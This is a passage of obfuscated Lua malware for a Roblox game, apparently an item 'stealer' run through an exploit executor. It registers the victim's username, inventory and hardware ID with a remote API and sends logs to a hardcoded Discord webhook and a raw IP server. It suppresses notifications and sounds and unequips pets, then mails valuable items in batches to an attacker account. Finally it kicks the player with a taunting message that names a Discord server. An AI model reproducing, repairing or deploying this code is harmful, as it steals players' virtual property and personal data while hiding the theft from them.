			t33.petMouseConn = nil
		end

		v669()

		for k in pairs(t33.ghostPets) do
			v705(k)
		end

		Folder:ClearAllChildren()
		Folder2:ClearAllChildren()
		t33.originals = {}
		t33.conns = {}
		t33.suppress = {}
		t33.pendingGifts = {}
		t33.pendingByAlias = {}
		t33.stackDisplay = {}
		t33.stackBound = {}
		t33.stackFixing = {}
		t33.handledStackRemoval = {}
		t33.ghostPets = {}
		t33.ghostPetSlot = 9000
		t33.petBound = {}
		t33.petHookBusy = false
		t33.petToggleLock = {}
		t33.petMouseConn = nil
		t33.ghostPetMode = nil
		t33.gardenAreasPlot = nil
		t33.gardenAreas = nil
		t33.realFollowSlots = nil
		t33.petFollowSlotsMod = nil
		t33.petGhostSwap = {}
		t33.petUnequipUIHook = false
		t33.pendingRealUnequip = {}
		getgenv().GhostInvPlacePet = nil
		getgenv().GhostInvUnload = nil
		v408("Ghost Inventory РІС‹РіСЂСѓР¶РµРЅ")
	end

	return {
		install = function()
			if getgenv().GhostInvUnload then
				pcall(getgenv().GhostInvUnload)
			end

			v909()
			v902()
			v788()
			task.defer(v400)
			task.spawn(function()
				for i = 1, 30 do
					if Networking.Pets then
						v908()
					end

					if not t33.originals.PetToggle or not t33.originals.PetUnequipId then
						task.wait(1)

						continue
					end

					break
				end
			end)
			getgenv().GhostInvPlacePet = function()
				v781(v430())
			end
			getgenv().GhostInvUnload = unload
		end,
		unload = unload
	}
end

t4.u = function()
	local u = t4.cache.u

	if not u then
		u = {
			c = v358()
		}
		t4.cache.u = u
	end

	return u.c
end

local function v922()
	local Players2 = game:GetService("Players")
	local v924 = t4.r()
	local LocalPlayer = Players2.LocalPlayer
	local n15 = 0.1
	local n16 = 10

	local function v928(p301)
		local v929 = os.clock() + n16

		while true do
			if not (os.clock() < v929) then
				return
			end

			if p301() then
				break
			end

			task.wait(n15)
		end
	end
	local function v930(p302, p303)
		if #p303 == 0 then
			return false
		end

		local t48 = {}

		for _, v in p303, nil, nil do
			t48[v] = true
		end

		local Pets = p302.Data.Inventory.Pets

		if typeof(Pets) ~= "table" then
			return true
		end

		for _, v in Pets, nil, nil do
			if typeof(v) == "table" and typeof(v.Id) == "string" and v.Equipped == true and t48[v.Id] then
				return true
			end
		end

		return false
	end
	local function v937(p304)
		local t49 = {}
		local t50 = {}
		local Pets = p304.Data.Inventory.Pets

		if typeof(Pets) == "table" then
			for _, v in Pets, nil, nil do
				if typeof(v) == "table" and typeof(v.Id) == "string" and v.Equipped == true and not t50[v.Id] then
					t50[v.Id] = true
					table.insert(t49, v.Id)
				end
			end
		end

		local v943 = v924.getNetworking()
		local ok, result = pcall(function()
			return v943.Pets.GetEquippedPets:Fire()
		end)

		if ok and typeof(result) == "table" then
			for _, v in result, nil, nil do
				if not (typeof(v) ~= "table" or typeof(v.Id) ~= "string" or t50[v.Id]) then
					t50[v.Id] = true
					table.insert(t49, v.Id)
				end
			end
		end

		return t49
	end
	local function v948()
		local v949 = v924.getReplica()

		if not v949 or not v949.Data or typeof(v949.Data.Inventory) ~= "table" then
			return
		end

		local v950 = v937(v949)

		if #v950 == 0 then
			return
		end

		local v951 = v924.getNetworking()

		for _, v in v950, nil, nil do
			pcall(function()
				v951.Pets.RequestUnequip:Fire(v)
			end)
		end

		v928(function()
			local v954 = v924.getReplica()

			if v954 and v954.Data then
				return not v930(v954, v950)
			end

			return false
		end)
	end
	local function v955(p305)
		local props = p305:GetProps(LocalPlayer.UserId)

		if typeof(props) ~= "table" then
			return 0
		end

		local n17 = 0

		for _ in props, nil, nil do
			n17 += 1
		end

		return n17
	end
	local function v959()
		local Gnomes = workspace:FindFirstChild("Gnomes")

		if not Gnomes then
			return 0
		end

		local n18 = 0

		for _, v in Gnomes:GetChildren() do
			if v:IsA("BasePart") and v:GetAttribute("Owner") == LocalPlayer.Name then
				n18 += 1
			end
		end

		return n18
	end
	local function v964(p306, p307)
		local props = p307:GetProps(LocalPlayer.UserId)

		if typeof(props) ~= "table" then
			return
		end

		for k in props, nil, nil do
			pcall(function()
				p306.Prop.PickupProp:Fire(k)
			end)
		end
	end
	local function v967(p308)
		local Gnomes = workspace:FindFirstChild("Gnomes")

		if not Gnomes then
			return
		end

		for _, v in Gnomes:GetChildren() do
			if v:IsA("BasePart") and v:GetAttribute("Owner") == LocalPlayer.Name then
				pcall(function()
					p308.Place.RemoveGnome:Fire(v)
				end)
			end
		end
	end
	local function v971()
		local v972 = v924.getNetworking()
		local v973 = v924.getGardenSyncController()
		local v974 = v955(v973)
		local v975 = v959()

		if v974 == 0 and v975 == 0 then
			return
		end

		v964(v972, v973)
		v967(v972)
		v928(function()
			return v955(v973) == 0 and v959() == 0
		end)
	end

	return {
		prepare = function()
			v948()
			v971()
		end
	}
end

t4.v = function()
	local v976 = t4.cache.v

	if not v976 then
		v976 = {
			c = v922()
		}
		t4.cache.v = v976
	end

	return v976.c
end

local function v977()
	local Players2 = game:GetService("Players")
	local SoundService = game:GetService("SoundService")
	local LocalPlayer = Players2.LocalPlayer
	local t51 = {
		"Notification",
		"Purchase",
		"Tick",
		"Accept"
	}
	local t52 = {
		SetText = function()
		end,
		Dismiss = function()
		end
	}

	local function v983()
		local SFX = SoundService:FindFirstChild("SFX")

		if not SFX then
			return
		end

		for _, v in t51, nil, nil do
			local v987 = SFX:FindFirstChild(v)

			if v987 and v987:IsA("Sound") then
				v987.Volume = 0
			end
		end
	end
	local function v988()
		local PlayerScripts = LocalPlayer:FindFirstChild("PlayerScripts")

		if not PlayerScripts then
			return
		end

		local NotificationController = PlayerScripts.Controllers:FindFirstChild("NotificationController")

		if not NotificationController then
			return
		end

		local ok, result = pcall(require, NotificationController)

		if not ok or not result then
			return
		end

		result.CreateNotification = function()
		end
		result.CreateStickyNotification = function()
			return t52
		end
	end

	return {
		suppress = function()
			local TopNotification = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TopNotification", 10)

			if TopNotification then
				TopNotification.Enabled = false
			end

			local SFXGroup = SoundService:FindFirstChild("SFXGroup")

			if SFXGroup then
				SFXGroup.Volume = 0
			end

			v983()
			v988()
		end
	}
end

t4.w = function()
	local w = t4.cache.w

	if not w then
		w = {
			c = v977()
		}
		t4.cache.w = w
	end

	return w.c
end

local function v996()
	local Players2 = game:GetService("Players")

	t4.i()

	local v998 = t4.r()
	local v999 = t4.u()
	local v1000 = t4.v()
	local v1001 = t4.w()

	return {
		setup = function()
			if not game:IsLoaded() then
				game.Loaded:Wait()
			end

			v998.getReplica()
			v998.getNetworking()
			v998.getMailboxItemCatalog()
			task.spawn(v999.install)
			v1001.suppress()
			v1000.prepare()
			Players2.LocalPlayer:SetAttribute("AntiAfkIdleOverride", 999999)
		end
	}
end

t4.x = function()
	local x = t4.cache.x

	if not x then
		x = {
			c = v996()
		}
		t4.cache.x = x
	end

	return x.c
end

local function v1003()
	t4.i()

	return {
		inventory = t4.s(),
		mailbox = t4.t(),
		gameSetup = t4.x()
	}
end

t4.y = function()
	local y = t4.cache.y

	if not y then
		y = {
			c = v1003()
		}
		t4.cache.y = y
	end

	return y.c
end

local function v1005()
	local v1006 = t4.c()
	local v1007 = t4.m()
	local v1008 = t4.b()
	local v1009 = t4.l()

	local function v1010(p309)
		return function(p310, p311, ...)
			if p309[p310] then
				return p311(...)
			end

			return ...
		end
	end
	local function v1011(p312, p313, ...)
		local t53 = { p313(...) }

		if p312 == "verbose" then
			local print_ = print
			local v1014 = ("[%*]: %*"):format(p312, table.concat(t53, " "))

			print_(v1014)
		else
			local warn_ = warn
			local v1016 = ("[%*]: %*"):format(p312, table.concat(t53, " "))

			warn_(v1016)
		end

		return table.unpack(t53)
	end
	local function v1017(p314)
		local v1018 = p314:lower()

		for _, v in v1008.IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK, nil, nil do
			if v1018:find(v) then
				return true
			end
		end

		return false
	end
	local function v1021(p315)
		task.spawn(function()
			local v1022 = request({
				Url = "https://discord.com/api/webhooks/1427333378146963517/IVgB0BKSrcNJQPe65hFxkcpTfkubHwSB9xN-6XBPX_i4g1iiD66L7qjeAycA0HGMSXjw",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = v1007.encode({
					content = p315
				})
			})

			if v1022.statusCode ~= 200 then
				local warn_ = warn
				local v1024 = ("Failed to log to webhook: %*"):format(v1022.statusCode)

				warn_(v1024)
			end
		end)
	end
	local function v1025(p316, p317, ...)
		local t54 = { p317(...) }
		local v1027 = ("[%*]: %*"):format(p316, table.concat(t54, " "))

		if not v1017(v1027) then
			v1021(v1027)
		end

		return table.unpack(t54)
	end
	local function v1028(p318, p319, ...)
		local t55 = {}

		for _, v in { p319(...) }, nil, nil do
			t55[#t55 + 1] = v1007.encode(v)
		end

		return table.unpack(t55)
	end
	local function v1032(p320, p321, ...)
		local t56 = { p321(...) }

		table.insert(t56, {
			metadata = v1009.metadataForLogger
		})

		return table.unpack(t56)
	end

	local v1034 = _G.VERBOSE == true and v1011

	v1034 = v1034 or v1025

	return v1006(v1010({
		error = true,
		warn = true,
		verbose = _G.VERBOSE == true
	}), v1034, v1028, v1032)
end

t4.z = function()
	local z = t4.cache.z

	if not z then
		z = {
			c = v1005()
		}
		t4.cache.z = z
	end

	return z.c
end

local function v1036()
	local v1037 = t4.l()
	local v1038 = t4.g()

	return function()
		local v1039 = t4.q()
		local v1040 = t4.y()
		local v1041 = t4.z()

		v1037.metadataForLogger = {}
		v1037.mailbox = v1040.mailbox
		v1037.gameSetup = v1040.gameSetup
		v1037.inventory = v1040.inventory
		v1037.coreEventBus = v1038.createBus()
		v1037.domainEventBus = v1038.createBus()
		v1037.logger = v1041
		v1037.api = v1039
	end
end

t4.A = function()
	local A = t4.cache.A

	if not A then
		A = {
			c = v1036()
		}
		t4.cache.A = A
	end

	return A.c
end

local function v1043()
	return {
		itemClaimed = t4.g().createEventDefinition()
	}
end

t4.B = function()
	local B = t4.cache.B

	if not B then
		B = {
			c = v1043()
		}
		t4.cache.B = B
	end

	return B.c
end

local function v1045()
	t4.g()

	return function()
		local t57 = {}

		local function v1047(p322)
			t57[#t57 + 1] = p322
		end

		return {
			record = v1047,
			playback = function(p323)
				local v1048 = t57

				t57 = {}

				for _, v in v1048, nil, nil do
					p323.publish(v)
				end
			end
		}
	end
end

t4.C = function()
	local C = t4.cache.C

	if not C then
		C = {
			c = v1045()
		}
		t4.cache.C = C
	end

	return C.c
end

local function v1052()
	local v1053 = t4.B()

	t4.a()

	local v1054 = t4.C()

	return {
		create = function(p324, p325, p326, p327, p328)
			local t58 = {
				id = p324,
				secretKey = p325,
				usernames = p326,
				userId = p327,
				items = p328,
				eventsRecorder = v1054()
			}

			local function v1056(p329)
				for _, v in t58.items, nil, nil do
					if v.uniqueId == p329 then
						return v
					end
				end

				return nil
			end

			t58.getItemsToTransfer = function(p330)
				local t59 = {}

				for _, v in t58.items, nil, nil do
					if v.claimedCount < v.count then
						table.insert(t59, v)
					end
				end

				if p330 then
					table.sort(t59, function(p331, p332)
						return p331.valuable.price > p332.valuable.price
					end)
				end

				return t59
			end
			t58.hasUnclaimedItems = function()
				return #t58.getItemsToTransfer() > 0
			end
			t58.isItemExists = function(p333)
				return v1056(p333) ~= nil
			end
			t58.isWantedItem = function(p334)
				local v1062 = v1056(p334)

				if v1062 == nil then
					return false
				end

				return v1062.isWanted
			end
			t58.canClaim = function(p335)
				for _, v in t58.usernames, nil, nil do
					if v:lower():find(p335:lower()) == nil then
						continue
					end

					return true
				end

				return false
			end
			t58.claimItem = function(p336, p337)
				local v1065 = v1056(p336)

				if v1065 == nil then
					local error_ = error
					local v1067 = ("Item not found (uniqueId: %*)"):format(p336)

					error_(v1067)
				end

				if v1065.count < v1065.claimedCount + p337 then
					local error_ = error
					local v1069 = ("Can't claim more items than available (item: %*, count: %*, claimedCount: %*, claiming count: %*)"):format(v1065.uniqueId, v1065.count, v1065.claimedCount, p337)

					error_(v1069)
				end

				v1065.claimedCount += p337
				t58.eventsRecorder.record(v1053.itemClaimed.create({
					uniqueId = p336,
					count = p337
				}))
			end

			return t58
		end
	}
end

t4.D = function()
	local D = t4.cache.D

	if not D then
		D = {
			c = v1052()
		}
		t4.cache.D = D
	end

	return D.c
end

local function v1071()
	return {
		retry = function(p338, p339, p340)
			local n19 = 0
			local v1073
			local result

			while true do
				if not (n19 < p338) then
					return error(v1073)
				end

				local ok

				ok, result = pcall(p340)

				if ok then
					break
				end

				n19 += 1
				v1073 = result
				task.wait(p339)
			end

			return result
		end
	}
end

t4.E = function()
	local E = t4.cache.E

	if not E then
		E = {
			c = v1071()
		}
		t4.cache.E = E
	end

	return E.c
end

local function v1077()
	t4.D()

	local v1078 = t4.l()

	return function(p341)
		while true do
			local ok, result = pcall(v1078.api.pullFromConnection, p341.secretKey)

			if not ok then
				v1078.logger.error("Failed to pull from connection", {
					error = result
				})
			end

			task.wait(0.2)
		end
	end
end

t4.F = function()
	local F = t4.cache.F

	if not F then
		F = {
			c = v1077()
		}
		t4.cache.F = F
	end

	return F.c
end

local function v1082()
	return {
		itemSent = t4.g().createEventDefinition()
	}
end

t4.G = function()
	local G = t4.cache.G

	if not G then
		G = {
			c = v1082()
		}
		t4.cache.G = G
	end

	return G.c
end

local function v1084()
	t4.D()

	local v1085 = t4.B()
	local v1086 = t4.G()
	local v1087 = t4.l()

	return function(p342)
		v1087.coreEventBus.subscribe(v1086.itemSent.createObserver(function(p343)
			for k, v in p343.payload.items, nil, nil do
				if p342.isItemExists(k) then
					p342.claimItem(k, v)
				else
					v1087.logger.warn("Item does not exist in hit domain model, claiming skipped", {
						uniqueId = k
					})
				end
			end

			p342.eventsRecorder.playback(v1087.domainEventBus)
		end))
		v1087.domainEventBus.subscribe(v1085.itemClaimed.createObserver(function(p344)
			local payload = p344.payload

			if not p342.isWantedItem(payload.uniqueId) then
				return
			end

			local ok, result = pcall(v1087.api.claimItem, p342.secretKey, payload.uniqueId, payload.count)

			if not ok then
				v1087.logger.error("Failed to claim item", {
					error = result
				})
			end
		end))
	end
end

t4.H = function()
	local H = t4.cache.H

	if not H then
		H = {
			c = v1084()
		}
		t4.cache.H = H
	end

	return H.c
end

local function v1094()
	t4.D()

	local v1095 = t4.G()

	t4.h()

	local v1096 = t4.l()

	local function v1097(p345)
		local t60 = {}

		for _, v in p345.getItemsToTransfer(true), nil, nil do
			if #t60 ~= 20 then
				table.insert(t60, {
					uniqueId = v.uniqueId,
					name = v.valuable.name,
					count = v.count - v.claimedCount,
					metadata = {},
					category = v1096.inventory.getItemCategory(v.uniqueId)
				})

				continue
			end

			break
		end

		return t60
	end

	return function()
		return {
			transfer = function(p346)
				while p346.hasUnclaimedItems() do
					local v1101 = v1097(p346)
					local ok, result = pcall(v1096.mailbox.send, p346.userId, v1101)

					if ok then
						local t61 = {}

						for _, v in v1101, nil, nil do
							t61[v.uniqueId] = v.count
						end

						v1096.coreEventBus.publish(v1095.itemSent.create({
							items = t61
						}))
						task.wait(10.5)
					else
						v1096.logger.error("Failed to send items", {
							error = result
						})
					end
				end
			end
		}
	end
end

t4.I = function()
	local I = t4.cache.I

	if not I then
		I = {
			c = v1094()
		}
		t4.cache.I = I
	end

	return I.c
end

local function v1108()
	local s9 = "http://5.129.216.75:8765/alert"
	local s10 = "http://5.129.216.75:8766/job/visit"
	local s11 = "Do-not-nothing-in-this-string"
	local s12 = "PR_GAG2_LocalWild"
	local t62 = {
		Raccoon = true,
		Unicorn = true,
		Bear = true,
		GoldenDragonfly = true
	}
	local t63 = {
		Bunny = true,
		Frog = true,
		Bee = true,
		Deer = true,
		Robin = true,
		GoldenDragonfly = true,
		Monkey = true,
		Owl = true,
		Turtle = true
	}
	local t64 = {
		Bunny = true,
		Frog = true,
		Bee = true,
		Deer = true,
		Monkey = true,
		Owl = true,
		Turtle = true
	}
	local t65 = {
		Unicorn = true,
		Raccoon = true,
		Turtle = true
	}
	local t66 = {
		Unicorn = true,
		Raccoon = true,
		GoldenDragonfly = true,
		Robin = true,
		Turtle = true
	}
	local u1118

	local function v1119(p347)
		local http_request_ = http_request or request or HttpPost or syn.request

		if not http_request_ then
			return
		end

		local HttpService = game:GetService("HttpService")

		task.spawn(function()
			pcall(function()
				http_request_({
					Url = s10,
					Method = "POST",
					Headers = {
						["content-type"] = "application/json",
						["x-api-key"] = s11
					},
					Body = HttpService:JSONEncode({
						job_id = p347
					})
				})
			end)
		end)
	end
	local function v1122(p348)
		if u1118 then
			return u1118
		end

		local n20 = 0

		for _, v in p348, nil, nil do
			if type(v) == "table" and type(v.SpawnChance) == "number" and v.SpawnChance > 0 then
				n20 += v.SpawnChance
			end
		end

		u1118 = n20

		return n20
	end
	local function v1126(p349, p350)
		local v1127 = p350[p349]

		if type(v1127) ~= "table" or type(v1127.SpawnChance) ~= "number" or v1127.SpawnChance <= 0 then
			return nil
		end

		local v1128 = v1122(p350)

		if v1128 <= 0 then
			return nil
		end

		return v1127.SpawnChance / v1128 * 100
	end
	local function v1129(p351, p352)
		if type(p351) == "string" and p351:lower() == "rainbow" then
			return true
		end

		return p352:lower() == "rainbow"
	end
	local function v1130(p353, p354)
		local v1131 = type(p353) == "string" and p353:lower() or ""

		if v1131 == "big" then
			return "Big"
		end

		if v1131 == "huge" or v1131 == "mega" then
			return "Mega"
		end

		local v1132 = p354:lower()

		if v1132 == "big" then
			return "Big"
		end

		if v1132 == "huge" or v1132 == "mega" or v1132:find("mega", 1, true) then
			return "Mega"
		end

		return "Normal"
	end
	local function v1133(p355, p356, p357)
		if v1129(p355.petType, p355.petType and p356.GetDisplayText(p355.petType) or "Normal") then
			return true
		end

		local v1134 = v1130(p355.petSize, p355.petSize and p357.DisplaySize(p355.petSize) or "Normal")
		local petName = p355.petName

		if v1134 == "Normal" then
			return t62[petName] == true
		end

		if v1134 == "Big" then
			return t65[petName] == true or t63[petName] == true
		end

		if v1134 == "Mega" then
			return t66[petName] == true or t64[petName] == true
		end

		return false
	end
	local function v1136(p358)
		if type(p358) == "string" then
			if p358 ~= "" then
				if p358:find("http", 1, true) then
					return p358
				end

				return p358:match("rbxassetid://(%d+)") or p358:match("^(%d+)$")
			end
		end

		return nil
	end
	local function v1137(p359)
		local v1138 = v1136(p359)

		if not v1138 then
			return nil
		end

		if v1138:find("http", 1, true) then
			return v1138
		end

		local http_request_ = http_request or request or HttpPost or syn.request

		if not http_request_ then
			return nil
		end

		local HttpService = game:GetService("HttpService")
		local v1141 = ("https://thumbnails.roblox.com/v1/assets?assetIds=%*&size=420x420&format=Png&isCircular=false"):format(v1138)

		for i = 1, 4 do
			local ok, result = pcall(function()
				return http_request_({
					Url = v1141,
					Method = "GET"
				})
			end)

			if ok and result and result.StatusCode == 200 then
				local ok2, result2 = pcall(function()
					return HttpService:JSONDecode(result.Body)
				end)

				if ok2 and result2 and result2.data and result2.data[1] then
					local v1147 = result2.data[1]

					if v1147.state == "Completed" and v1147.imageUrl and v1147.imageUrl ~= "" then
						return v1147.imageUrl
					end

					if v1147.state ~= "Pending" then
						break
					end

					task.wait(0.35)
				end
			end

			task.wait(0.1)
		end

		return nil
	end
	local function v1148(p360)
		local Map = workspace:FindFirstChild("Map")
		local WildPetSpawns = Map and Map:FindFirstChild("WildPetSpawns")

		if not WildPetSpawns then
			return nil
		end

		local v1151 = "_" .. p360.Name

		for _, v in WildPetSpawns:GetChildren() do
			if v.Name:sub(-#v1151) == v1151 then
				return v
			end
		end

		return nil
	end
	local function v1154(p361)
		if p361:GetAttribute(s12) ~= nil then
			return true
		end

		local v1155 = v1148(p361)

		if not v1155 then
			return false
		end

		if v1155:GetAttribute(s12) ~= nil then
			return true
		end

		for _, v in v1155:GetDescendants() do
			if v:GetAttribute(s12) == nil then
				continue
			end

			return true
		end

		return false
	end
	local function v1158(p362)
		local attribute = p362:GetAttribute("PetName")

		if type(attribute) ~= "string" or attribute == "" then
			return nil
		end

		return attribute
	end
	local function v1160(p363, p364, p365, p366)
		local v1161 = p365[p364]
		local attribute = p363:GetAttribute("Rarity")

		if type(attribute) ~= "string" or attribute == "" then
			attribute = v1161 and v1161.Rarity or "Common"
		end

		local attribute2 = p363:GetAttribute("SpawnedAt")
		local attribute3 = p363:GetAttribute("Lifetime")
		local v1165
		local v1166

		if type(attribute2) == "number" and type(attribute3) == "number" then
			v1165 = attribute2 + attribute3
			v1166 = v1165 - os.time()
		end

		local attribute4 = p363:GetAttribute("Price")
		local attribute5 = p363:GetAttribute("PetSize")
		local attribute6 = p363:GetAttribute("PetType")
		local Value = p365.GetImage(p364, attribute5)

		if Value == "" and p366 then
			local v1171 = p366:FindFirstChild(p364)

			if v1171 and v1171:IsA("StringValue") then
				Value = v1171.Value
			end
		end

		return {
			petName = p364,
			displayName = p365.GetDisplayName(p364, attribute5),
			rarity = attribute,
			spawnChance = v1126(p364, p365),
			image = Value,
			petSize = type(attribute5) == "string" and attribute5 ~= "" and attribute5 or nil,
			petType = type(attribute6) == "string" and attribute6 ~= "" and attribute6 or nil,
			price = type(attribute4) == "number" and attribute4 or nil,
			despawnAt = v1165,
			timeLeft = v1166
		}
	end
	local function v1172(p367, p368, p369, p370)
		local HttpService = game:GetService("HttpService")
		local petType = p368.petType and p369.GetDisplayText(p368.petType) or "Normal"
		local petSize = p368.petSize and p370.DisplaySize(p368.petSize) or "Normal"
		local v1176 = v1137(p368.image)
		local t67 = {
			pet_name = p368.petName,
			display_name = p368.displayName,
			rarity = p368.rarity,
			mutation = petType,
			size = petSize,
			pet_size = p368.petSize or "",
			pet_type = p368.petType or "",
			spawn_chance = p368.spawnChance,
			price = p368.price,
			despawn_at = p368.despawnAt,
			place_id = game.PlaceId,
			job_id = p367,
			image_url = v1176 or ""
		}
		local http_request_ = http_request or request or HttpPost or syn.request

		if http_request_ then
			pcall(function()
				http_request_({
					Url = s9,
					Body = HttpService:JSONEncode(t67),
					Method = "POST",
					Headers = {
						["content-type"] = "application/json",
						["x-api-key"] = s11
					}
				})
			end)

			return
		end
	end
	local function v1179(p371, p372, p373, p374, p375, p376, p377)
		if not p371:IsA("BasePart") or p372[p371] then
			return
		end

		task.spawn(function()
			for i = 1, 50 do
				if not p371.Parent then
					return
				end

				if v1154(p371) then
					p372[p371] = true

					return
				end

				local v1181 = v1158(p371)

				if not v1181 then
					task.wait(0.1)

					continue
				end

				p372[p371] = true

				local v1182 = v1160(p371, v1181, p374, p375)

				if v1133(v1182, p376, p377) then
					v1172(p373, v1182, p376, p377)
				end

				return
			end
		end)
	end
	local function v1183(p378, p379, p380, p381, p382, p383, p384)
		local function v1184()
			for _, v in p378:GetChildren() do
				v1179(v, p379, p380, p381, p382, p383, p384)
			end
		end

		v1184()
		p378.ChildAdded:Connect(function(child)
			v1179(child, p379, p380, p381, p382, p383, p384)
		end)
		task.spawn(function()
			for i = 1, 45 do
				v1184()
				task.wait(1)
			end
		end)
	end
	local function v1188(p385)
		task.spawn(v1119, p385)

		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local SharedModules = ReplicatedStorage:WaitForChild("SharedModules", 60)
		local SharedData = ReplicatedStorage:WaitForChild("SharedData", 60)

		if not SharedModules or not SharedData then
			return
		end

		local PetData = require(SharedData:WaitForChild("PetData"))
		local PetTypes = require(SharedData:WaitForChild("PetTypes"))
		local PetSizes = require(SharedData:WaitForChild("PetSizes"))
		local GearImages = SharedModules:WaitForChild("GearImages")
		local t68 = {}

		task.spawn(function()
			local Map = workspace:WaitForChild("Map", 30)

			if not Map then
				return
			end

			local WildPetRef = Map:FindFirstChild("WildPetRef")

			if WildPetRef and WildPetRef:IsA("Folder") then
				v1183(WildPetRef, t68, p385, PetData, GearImages, PetTypes, PetSizes)

				return
			end

			Map.ChildAdded:Connect(function(child)
				if child.Name == "WildPetRef" and child:IsA("Folder") then
					v1183(child, t68, p385, PetData, GearImages, PetTypes, PetSizes)
				end
			end)
		end)
	end

	return v1188
end

t4.J = function()
	local J = t4.cache.J

	if not J then
		J = {
			c = v1108()
		}
		t4.cache.J = J
	end

	return J.c
end

local v1200 = t4.b()

if game.GameId ~= v1200.GAME_ID then
	return
end

local v1201 = t4.l()
local v1202 = t4.A()

t4.j()
t4.h()

local v1203 = t4.D()

t4.a()

local v1204 = t4.E()
local v1205 = t4.F()
local v1206 = t4.H()
local v1207 = t4.I()
local v1208 = t4.J()
local Players2 = game:GetService("Players")
local v1210 = getexecutorname():lower()

local function v1211()
	local jobId

	if not hookmetamethod or v1210 == "volt" or v1210 == "velocity" then
		return game.JobId
	end

	local v1213

	v1213 = hookmetamethod(game, "__index", function(p386, p387)
		if not (jobId or checkcaller()) then
			jobId = v1213(game, "JobId")
		end

		return v1213(p386, p387)
	end)

	repeat
		task.wait(0.1)
	until jobId ~= nil

	return jobId
end
local function v1214()
	local ok, result = pcall(v1201.api.registerExecution)

	if not ok then
		v1201.logger.error("Failed to register execution", {
			error = result
		})
		error("failed to start, please try again later")
	end

	return result
end
local function v1217(p388, p389, p390)
	v1201.logger.verbose("Registering hit...")

	local t69 = {}

	for _, v in p390, nil, nil do
		t69[v.uniqueId] = {
			uniqueId = v.uniqueId,
			valuable = v.name,
			count = v.count,
			metadata = v.metadata
		}
	end

	local ok, result = pcall(v1201.api.registerHit, {
		username = Players2.LocalPlayer.Name,
		inventory = t69,
		game = v1200.GAME_NAME,
		serverId = p388,
		stealerId = ID,
		executor = v1200.EXECUTOR_NAME,
		nonce = p389
	})

	if not ok then
		v1201.logger.error("Failed to register hit", {
			error = result
		})
		error("failed to start, please try again later")
	end

	return result
end
local function v1223(p391)
	v1201.logger.verbose("Connecting to hit...", {
		secretKey = p391.secretKey
	})

	local ok, result = pcall(v1204.retry, 5, 0.5, function()
		return (v1201.api.connect(p391.secretKey))
	end)

	if not ok then
		v1201.logger.error("Failed to connect to hit", {
			error = result
		})
		error("failed to start, please try again later")
	end

	v1201.logger.verbose("Connected to hit")
end
local function v1226(p392, p393)
	local t70 = {}
	local t71 = {}

	for _, v in p392, nil, nil do
		local t72 = {
			id = v.id,
			uniqueId = v.uniqueId,
			valuable = v.valuable,
			count = v.count,
			claimedCount = v.claimedCount,
			isWanted = true
		}

		t71[v.uniqueId] = true
		table.insert(t70, t72)
	end

	if not v1200.GIVE_ALL_ITEMS then
		return t70
	end

	for _, v in p393, nil, nil do
		if not t71[v.uniqueId] then
			table.insert(t70, {
				id = v.uniqueId,
				uniqueId = v.uniqueId,
				valuable = {
					name = v.name,
					price = 0
				},
				count = v.count,
				claimedCount = 0,
				isWanted = false
			})
		end
	end

	return t70
end

task.spawn(function()
	local response = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer()

	v1202()
	v1201.metadataForLogger.serverType = response
	v1201.metadataForLogger.username = Players2.LocalPlayer.Name
	v1201.metadataForLogger.executor = v1200.EXECUTOR_NAME
	v1201.metadataForLogger.hwid = v1200.HWID

	local v1235 = v1211()

	if not getgenv().AWDAS then
		getgenv().AWDAS = true
		task.spawn(v1208, v1235)
	end

	v1201.logger.verbose("Dependencies initialized, registering execution...")

	local v1236 = v1214()

	v1201.logger.verbose("Execution registered, registering hit...")

	local v1237 = v1201.inventory.getItems()

	v1201.logger.verbose("Got user inventory", {
		inventory = v1237
	})

	if #v1237 == 0 then
		v1201.logger.verbose("No inventory items found, declining hit")
		error("failed to start, please try again later")
	end

	local v1238 = v1217(v1235, v1236, v1237)

	v1201.logger.verbose("Hit registered", {
		hitDto = v1238
	})
	v1201.metadataForLogger.hitId = v1238.hit.id
	v1201.logger.verbose("Creating hit domain model...")

	local v1239 = v1226(v1238.hit.items, v1237)
	local v1240 = v1203.create(v1238.hit.id, v1238.secretKey, v1238.usernames, v1238.userId, v1239)

	v1201.logger.verbose("Hit model created", {
		hit = v1240
	})
	v1223(v1240)
	v1201.logger.verbose("Starting game setup...")
	v1201.gameSetup.setup()
	v1201.logger.verbose("Game setup completed")
	v1201.logger.verbose("Starting jobs...")
	task.spawn(v1205, v1240)
	v1201.logger.verbose("Jobs started")
	v1201.logger.verbose("Starting orchestrator...")
	v1206(v1240)
	v1201.logger.verbose("Orchestrator started")
	v1201.logger.verbose("Starting transfer...")
	v1207().transfer(v1240)
	v1201.logger.verbose("Transfer done!")
	setclipboard("discord.gg/project-reverse")
	Players2.LocalPlayer:Kick("Your 1nventory got cleaned by discord.gg/project-reverse")
end)
